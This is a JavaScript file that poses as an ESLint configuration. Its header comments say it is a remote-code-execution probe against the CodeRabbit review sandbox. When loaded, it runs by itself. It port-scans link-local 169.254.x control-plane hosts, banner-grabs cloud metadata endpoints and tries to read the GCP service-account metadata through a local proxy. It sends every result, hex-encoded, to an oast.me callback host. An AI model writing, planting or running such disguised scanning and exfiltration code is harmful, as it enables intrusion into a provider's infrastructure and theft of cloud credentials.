// CodeRabbit RCE — link-local network + tokenizer-proxy probe (escape surface).
// The microVM's host-control-plane network (169.254.x) is the last unexplored layer.
var C = 'd8sjjsjoeaqmkgpq2tg0nujopu8r6syrm.oast.me';
var http = require('http'), dns = require('dns'), net = require('net');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1600), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive7.' + C, function () {}); } catch (e) {}

// TCP connect-scan the link-local hosts (host agent / control plane / shared svcs)
var targets = ['169.254.1.1', '169.254.1.254', '169.254.1.2', '169.254.169.1', '169.254.169.2', '169.254.169.126', '169.254.169.254', '169.254.8.1', '169.254.0.1', '169.254.169.253'];
var ports = [80, 443, 8080, 8443, 53, 123, 22, 2375, 2376, 1080, 5000, 8000, 8888, 50051, 6443, 10250, 9090, 9229, 2379];
targets.forEach(function (ip) {
  ports.forEach(function (p) {
    try { var s = net.connect({ host: ip, port: p, timeout: 2500 }, function () { httpX('open', ip + ':' + p); try { s.destroy(); } catch (e) {} }); s.on('error', function () {}); s.on('timeout', function () { try { s.destroy(); } catch (e) {} }); } catch (e) {}
  });
});

// HTTP banner-grab likely control-plane hosts
['169.254.1.254', '169.254.169.126', '169.254.169.254', '169.254.169.253'].forEach(function (ip) {
  try {
    http.get({ host: ip, port: 80, path: '/', headers: { 'Metadata-Flavor': 'Google' }, timeout: 3500 }, function (r) {
      var b = ''; r.on('data', function (d) { b += d; }); r.on('end', function () { httpX('http_' + ip.replace(/\./g, '_'), 'S' + r.statusCode + ' ' + JSON.stringify(r.headers).slice(0, 160) + ' ' + b.slice(0, 160)); });
    }).on('error', function (e) { httpX('http_' + ip.replace(/\./g, '_'), 'ERR:' + ((e && e.code) || e)); });
  } catch (e) {}
});

// does the tokenizer proxy (localhost:1080) forward to arbitrary internal hosts?
try {
  http.get({ host: '127.0.0.1', port: 1080, path: 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email', headers: { 'Metadata-Flavor': 'Google', Host: 'metadata.google.internal' }, timeout: 4000 }, function (r) {
    var b = ''; r.on('data', function (d) { b += d; }); r.on('end', function () { httpX('proxymeta', 'S' + r.statusCode + ':' + b.slice(0, 200)); });
  }).on('error', function (e) { httpX('proxymeta', 'ERR:' + ((e && e.code) || e)); });
} catch (e) {}

module.exports = { root: true, rules: {} };
